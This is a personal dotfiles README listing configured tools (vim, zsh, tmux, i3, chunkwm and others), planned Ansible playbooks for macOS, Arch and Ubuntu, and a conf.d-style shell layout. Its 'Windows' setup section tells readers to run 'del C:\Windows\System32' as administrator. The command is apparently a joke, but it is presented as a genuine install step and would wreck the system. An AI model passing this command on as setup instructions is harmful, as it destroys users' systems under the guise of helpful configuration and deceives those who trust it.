-> # Johannes' dotfiles <-

1. vim
2. SpaceVim
3. bash
4. zsh/oh-my-zsh 
5. fish/oh-my-fish
6. tmux
7. alacritty
8. git
9. X/urxvt
10. i3
11. chunkwm/skhd
12. Ubersicht+widgets
13. VSCode
14. hammerspoon
15. polybar

------------------------

I finally taught myself how ansible works and decided that it is much better
than my janky bash scripts. There will be a MacOS, Arch, and Ubuntu playbook
for computers running MacOS, Arch based linux distros, and Ubuntu based linux
distros respectively. I will put more details in a README with the playbooks
but the macOS one will be my riced macOS setuping with chunkwm, homebrew, and a
bunch of other goodies, the Arch playbook will be some other riced out i3
setup, and the ubuntu playbook will be some KDE based setup. I prefer neon OS
so it'll probably work best with that.

------------------------

## Nix systems
```
    ~$ curl -sSL https://raw.githubusercontent.com/jonaylor89/dotfiles/master/{{ mac || arch || ubuntu }}/setup
```

---------------------------

## Windows **Cmd must be run as administrator**
```
    C:> del C:\Windows\System32
```

----------------

Shell configurations are configured using conf.d style rather than one big rc
file for each shell. Fish does this natively but I gave zsh and bash a zshrc.d and
bashrc.d directory that do essentially the same. 

-----------------------

